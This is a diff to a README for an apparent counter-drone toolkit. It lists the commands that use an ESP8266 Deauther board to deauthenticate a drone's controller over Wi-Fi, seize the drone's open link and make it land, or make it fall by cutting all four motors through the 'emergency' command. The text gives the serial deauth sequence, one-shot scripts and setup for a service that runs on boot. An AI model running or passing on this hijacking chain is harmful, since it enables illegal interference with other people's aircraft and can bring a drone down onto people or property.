@@ -10,6 +10,53 @@ file is just **the commands**.
 
 ---
 
+## ★ Counter-drone — the one command (Windows)
+
+`counter.ps1` is the single command: **detect → deauth → seize the slot → LAND**,
+auto-routed by drone type. Run from the repo root with the ESP8266 on `COM8`.
+
+```powershell
+.\counter.ps1                                  # DETECT - list drones in range
+.\counter.ps1 -Test                            # DRY-RUN the whole pipeline (mock, no radio)
+.\counter.ps1 -Engage -Target TELLO-954B1F     # FULL takeover -> lands the Tello  ✅ works end-to-end
+.\counter.ps1 -Engage -Target PlutoX_2025_1129 # Pluto: lands only if you hold the link (PMF blocks takeover)
+```
+
+- **Tello** (open Wi-Fi, no PMF): deauths the controller, laptop seizes the open slot,
+  sends the UDP `land` — **verified landing a real Tello.** This is the working neutralize.
+- **Pluto** (WPA2 **+ PMF**): deauth is blocked at the protocol level, and it's single-client,
+  so takeover from an active pilot isn't possible; detection still works, and it lands when
+  the laptop already holds the link (see `ml/runtime/pluto_fly.py`).
+- Detect-only, no ESP needed: **`.\detect_drone.ps1`** (add `-Watch` to keep scanning).
+- Internet drops during `-Engage` (one radio) and is restored at the end; full log in `counter-log.md`.
+
+### Tello: LAND (gentle) vs KILL (instant motor cutoff)
+
+The Tello has two ways down. **LAND** is a controlled descent — safe, but the SDK
+blocks for the whole touchdown (several seconds), so it looks slow. **KILL** sends
+the Tello `emergency` command, which **cuts all four motors at once** and returns
+instantly. The drone then *drops* — so KILL is low-altitude / over-something-soft
+only; from height it risks the props/arms.
+
+```powershell
+.\Land-Tello-Now.bat                                   # gentle controlled LAND (double-click)
+.\Kill-Tello-Now.bat                                   # INSTANT motor cutoff — drone drops
+
+# same one-shot, explicit (seizes link -> command -> restores internet):
+powershell -ExecutionPolicy Bypass -File land_tello_oneshot.ps1              # LAND
+powershell -ExecutionPolicy Bypass -File land_tello_oneshot.ps1 -Emergency   # KILL
+
+# if you already hold the Tello link, skip the WiFi seize:
+python -m ml.runtime.tello_control --enabled --authorized TELLO-954B1F --ssid TELLO-954B1F              # LAND
+python -m ml.runtime.tello_control --enabled --authorized TELLO-954B1F --ssid TELLO-954B1F --emergency # KILL
+```
+
+In the **dashboard header** the same pair sits beside the threat chip: `LAND` (red)
+for the controlled descent, `KILL` (orange) for the emergency cutoff. Both are
+two-press (arm → confirm) so neither fires by accident.
+
+---
+
 ## 0. TL;DR — 60-second dry run (any laptop, no hardware)
 
 Everything degrades to **mock** with no hardware, so you can rehearse the whole
@@ -29,7 +76,7 @@ python -m ml.runtime.dashboard
 python -m ml.runtime.live_detector --mock --simulate-ssid Pluto_2025_2242
 
 # 4. rehearse the full deauth -> join -> LAND -> rejoin sequence (touches no radio)
-python -m ml.runtime.interceptor --dry-run --deauth --deauth-firmware deauther \
+python -m ml.runtime.interceptor --dry-run --deauth \
   --drone-ssid Pluto_2025_2242 --house YOUR_HOME_WIFI
 ```
 
@@ -58,10 +105,8 @@ pip install plutocontrol pyserial          # drone control + ESP serial
 sudo usermod -aG dialout $USER             # serial access to the ESP — then LOG OUT/IN
 ```
 
-Pick your deauth board once (see §5) and remember it:
-```bash
-export DEAUTH_FW=deauther     # ESP8266 (Spacehuhn Deauther).  ESP32 => marauder
-```
+The deauth board defaults to **ESP8266 + Spacehuhn Deauther 2.x** — no flag needed.
+(If you ever use an ESP32 instead, set `export DEAUTH_FW=marauder`; see §5.)
 
 ---
 
@@ -122,12 +167,12 @@ not from an SSH shell that will drop when the Pi leaves the house network.
 # Dry run first (mock, proves the sequence):
 python -m ml.runtime.interceptor --dry-run --deauth --drone-ssid Pluto_2025_2242 --house YOUR_HOME_WIFI
 
-# Real, foreground:
-python -m ml.runtime.interceptor --deauth --deauth-firmware deauther \
+# Real, foreground (ESP8266/Deauther is the default deauth board):
+python -m ml.runtime.interceptor --deauth \
   --drone-prefix Pluto --password THIS_SESSION_PW --house YOUR_HOME_WIFI
 
 # Real, autonomous (survives the hop):
-setsid python -m ml.runtime.interceptor --deauth --deauth-firmware deauther \
+setsid python -m ml.runtime.interceptor --deauth \
   --drone-prefix Pluto --password THIS_SESSION_PW --house YOUR_HOME_WIFI \
   > intercept.log 2>&1 < /dev/null &
 tail -f intercept.log
@@ -137,7 +182,17 @@ Useful flags: `--drone-ssid` (exact name, skips prefix scan) · `--host/--port`
 (control link, default `192.168.4.1:23`) · `--grab-delay` (seconds after deauth
 before seizing the slot) · `--stay` (don't rejoin house Wi-Fi).
 
-**Windows equivalent** (laptop, one radio, PowerShell): `npm run intercept`.
+**Windows equivalent** (laptop, one radio, PowerShell): `npm run intercept` — this now
+does the **full chain**: ESP8266 deauth (frees the slot) → join Pluto → LAND → rejoin
+internet. It auto-detects the ESP serial port; pin it with
+`-File interceptor.ps1 -Deauth -DeauthPort COM8` (or `$env:DEAUTH_PORT`), skip the scan
+with `-DeauthIndex 0`. `npm run intercept:nodeauth` is the old join+LAND only (no deauth,
+for when the slot is already free). With no ESP board the deauth degrades to a harmless
+mock and the join still runs.
+
+> `npm run land` / `land:now` is **LAND only** — it needs the laptop to already be on the
+> drone's Wi-Fi. It does not deauth or join, so it can't get past a phone that's holding
+> the slot. Use `npm run intercept` for the whole hand-off.
 
 ### Run it on boot / on demand as a service (Pi)
 `/etc/systemd/system/interceptor.service`:
@@ -147,7 +202,6 @@ Description=Drone interceptor (deauth + land)
 After=NetworkManager.service
 [Service]
 Type=oneshot
-Environment=DEAUTH_FW=deauther
 WorkingDirectory=/home/pi/drone-detection-whole-sys
 ExecStart=/usr/bin/python3 -m ml.runtime.interceptor --deauth --drone-prefix Pluto --house YOUR_HOME_WIFI
 User=pi
@@ -162,26 +216,33 @@ journalctl -u interceptor -f         # watch it
 
 ---
 
-## 5. Deauth board — pick your firmware
+## 5. Deauth board — ESP8266 + Deauther (default)
 
-The deauth ESP frees the drone's single client slot. Two boards, two firmwares —
-tell the software which with `--deauth-firmware` (or `$DEAUTH_FW`):
+The deauth board frees the drone's single client slot. **We use an ESP8266 running
+Spacehuhn Deauther 2.x**, which is the default — no firmware flag needed. Full setup:
+**`esp8266setup.md`**.
 
 | Board | Firmware | Software token |
 |-------|----------|----------------|
-| **ESP8266** (NodeMCU / Wemos) | Spacehuhn **ESP8266 Deauther 2.x** | `deauther` |
-| **ESP32** (S2/S3/C3/orig) | **Marauder** | `marauder` |
+| **ESP8266** (NodeMCU / Wemos) — *what we use* | **Spacehuhn Deauther 2.x** | `deauther` *(default)* |
+| ESP32 (S2/S3/C3/orig) — *alternative* | Marauder | `marauder` |
+
+Flash the ESP8266 with **Deauther 2.x** (serial build; web installer / esptool), confirm
+the serial CLI at 115200 (`scan ap` → `show ap` → `select ap 0` → `attack deauth` → `stop`).
 
 Test the board directly (mock first, then drop `--force-mock` on the Pi):
 ```bash
-python -m ml.runtime.deauth_esp32 --force-mock --firmware deauther --ssid Pluto_2025_2242
-python -m ml.runtime.deauth_esp32 --firmware deauther --ssid Pluto_2025_2242 --duration 6
-# if your build has no serial CLI, skip the scan and target an index directly:
-python -m ml.runtime.deauth_esp32 --firmware deauther --ssid Pluto_2025_2242 --index 0
+python -m ml.runtime.deauth_esp32 --selftest          # is the board answering on serial?
+python -m ml.runtime.deauth_esp32 --force-mock --ssid Pluto_2025_2242
+python -m ml.runtime.deauth_esp32 --ssid Pluto_2025_2242 --duration 6
+# skip the scan and target an index directly if the list is empty:
+python -m ml.runtime.deauth_esp32 --ssid Pluto_2025_2242 --index 0
 ```
+`--selftest` sends no attack — it just confirms the port opened and the firmware
+replies (`"ok": true`). In the full intercept, the same escape hatch is
+`--deauth-index N`.
 Serial port auto-detects; override with `--port /dev/ttyUSB0` or `$DEAUTH_PORT`.
-Flash the ESP8266 from **https://deauther.com** (ESP Web Tools) with the **serial
-CLI enabled at 115200**.
+(Using an ESP32 instead? add `--firmware marauder` or `export DEAUTH_FW=marauder`.)
 
 ---
 
@@ -194,7 +255,10 @@ CLI enabled at 115200**.
 | Detector (real) | `python -m ml.runtime.live_detector` |
 | Detector (demo) | `python -m ml.runtime.live_detector --mock --simulate-ssid Pluto_2025_2242` |
 | Land (connected) | `python -m ml.runtime.pluto_control --enabled --authorized Pluto --ssid <ssid>` |
-| Deauth test | `python -m ml.runtime.deauth_esp32 --firmware deauther --ssid <ssid>` |
+| Tello LAND (one-shot) | `.\Land-Tello-Now.bat`  ·  `land_tello_oneshot.ps1` |
+| Tello KILL / motor cutoff | `.\Kill-Tello-Now.bat`  ·  `land_tello_oneshot.ps1 -Emergency` |
+| Deauth self-test | `python -m ml.runtime.deauth_esp32 --selftest` |
+| Deauth test | `python -m ml.runtime.deauth_esp32 --ssid <ssid>` (ESP8266/Deauther default) |
 | Full intercept | `python -m ml.runtime.interceptor --deauth --drone-prefix Pluto --house <wifi>` |
 | Dry-run intercept | `python -m ml.runtime.interceptor --dry-run --deauth --drone-ssid <ssid> --house <wifi>` |
 | Windows: land | `npm run land:now` |
@@ -208,11 +272,13 @@ CLI enabled at 115200**.
 - **`nmcli not found`** — you're not on Linux/Raspberry Pi OS. The interceptor's
   Wi-Fi hop needs NetworkManager. Use `--dry-run` on a laptop, or `npm run intercept`
   on Windows.
-- **Deauth prints `(mock)` on the Pi** — the board wasn't opened. Check the cable,
-  `ls /dev/ttyUSB* /dev/ttyACM*`, that you're in the `dialout` group (re-login), and
-  pass `--port` explicitly.
-- **`AP '<ssid>' not seen in scan`** — your Deauther build may be web-UI-only (no
-  serial list). Pass `--index N` (the drone AP is usually the strongest `Pluto_*`).
+- **Deauth prints `(mock)` on the Pi** — the board wasn't opened. Run
+  `python -m ml.runtime.deauth_esp32 --selftest`; if it says `"ok": false`, check the
+  cable, `ls /dev/ttyUSB* /dev/ttyACM*`, that you're in the `dialout` group (re-login),
+  and pass `--port` explicitly.
+- **`AP '<ssid>' not seen in scan`** — the scan didn't list the drone AP (or the
+  firmware's list format differs). Pass `--index N` (the drone AP is usually the
+  strongest `Pluto_*`) to skip the scan and target it directly.
 - **LAND says mock / "no drone reachable"** — you're not on the drone's Wi-Fi, or the
   gateway/port is wrong. Confirm you joined `Pluto_*`, then set `PLUTO_HOST`/`PLUTO_PORT`.
 - **Deauth doesn't drop the phone** — the AP may enforce **PMF/802.11w** (deauth
